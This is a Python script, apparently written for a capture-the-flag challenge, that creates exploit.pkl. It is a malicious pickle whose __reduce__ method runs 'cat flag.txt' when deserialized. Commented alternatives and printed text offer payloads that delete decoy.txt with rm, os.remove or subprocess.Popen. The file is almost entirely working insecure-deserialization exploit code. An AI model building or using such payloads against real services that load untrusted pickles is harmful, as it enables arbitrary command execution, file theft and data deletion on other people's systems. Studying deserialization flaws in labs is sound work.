import pickle
import os
import subprocess

class MaliciousPickle:
    def __reduce__(self):
        # This method returns a tuple of (callable, args) that gets executed during deserialization
        # Option 1: Delete decoy.txt using os.system
        # return (os.system, ('rm -f decoy.txt',))
        
        # Option 2: Delete decoy.txt using os.remove
        # return (os.remove, ('decoy.txt',))
        
        # Option 3: Rename decoy.txt to decoy.txt.bak
        # return (os.system, ('mv decoy.txt decoy.txt.bak',))
        
        # Option 4: Directly read and print flag.txt contents (most direct approach)
        # This uses subprocess.check_output to capture the output
        return (subprocess.check_output, (['cat', 'flag.txt'],))
        
        # Option 5: Using subprocess.Popen to delete
        # return (subprocess.Popen, (['rm', 'decoy.txt'],))

# Create an instance of our malicious class
malicious_obj = MaliciousPickle()

# Serialize the malicious object to a pickle file
with open('exploit.pkl', 'wb') as f:
    pickle.dump(malicious_obj, f)

# Verify the file was created
if os.path.exists('exploit.pkl'):
    file_size = os.path.getsize('exploit.pkl')
    print(f"[SUCCESS] Malicious pickle payload created: exploit.pkl")
    print(f"[INFO] File size: {file_size} bytes")
    print("\n[PAYLOAD ANALYSIS]")
    print("When this pickle is deserialized by the server:")
    print("1. The __reduce__ method returns (subprocess.check_output, (['cat', 'flag.txt'],))")
    print("2. pickle.loads() will execute: subprocess.check_output(['cat', 'flag.txt'])")
    print("3. This will read the contents of flag.txt and return them")
    print("4. The flag will be revealed in the server's response/output")
    print("\n[ALTERNATIVE PAYLOADS]")
    print("To delete decoy.txt instead, modify __reduce__ to return:")
    print("  (os.system, ('rm -f decoy.txt',))")
    print("  OR")
    print("  (os.remove, ('decoy.txt',))")
    print("  OR")
    print("  (subprocess.Popen, (['rm', 'decoy.txt'],))")
else:
    print("[ERROR] Failed to create exploit.pkl")
